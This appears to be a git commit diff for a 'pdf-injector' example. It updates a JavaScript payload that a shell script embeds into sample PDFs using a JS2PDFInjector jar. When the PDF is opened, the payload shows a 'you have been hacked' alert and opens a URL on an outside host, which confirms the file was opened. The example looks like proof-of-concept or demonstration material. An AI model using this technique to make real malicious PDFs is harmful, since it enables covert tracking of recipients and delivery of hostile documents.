3b6c9b8fc3d8ac9df624e4dcaf98cb16bb1efad4
igraczech <suculent@me.com>
2019-05-02 12:41:54 +0200

    improving examples, works well with Google Chrome

--- examples/pdf-injector/embed.js
+++ examples/pdf-injector/embed.js
@@ -1,2 +1,7 @@
-alert("You've been hacked.");
-app.launchURL("http://micro.thinx.cloud:5000/images/transparent.png", true);
+if (typeof(app) !== "undefined") {
+  app.alert("Congratulations, your Adobe App has been hacked!");
+  app.launchURL("http://micro.thinx.cloud:5000/images/transparent.png", true);
+} else {
+  alert("Congratulations, your browser has been hacked.");
+  window.location("http://micro.thinx.cloud:5000/images/transparent.png", true);
+}
--- examples/pdf-injector/embed.sh
+++ examples/pdf-injector/embed.sh
@@ -1,2 +1,4 @@
-java -jar ./pdf-injector/JS2PDFInjector/dist/JS2PDFInjector.jar ./min-1.1.pdf ./embed.js
+#!/bin/bash
 
+java -jar ./JS2PDFInjector/dist/JS2PDFInjector.jar ./min-1.1.pdf ./embed.js
+java -jar ./JS2PDFInjector/dist/JS2PDFInjector.jar ./min-1.4.pdf ./embed.js
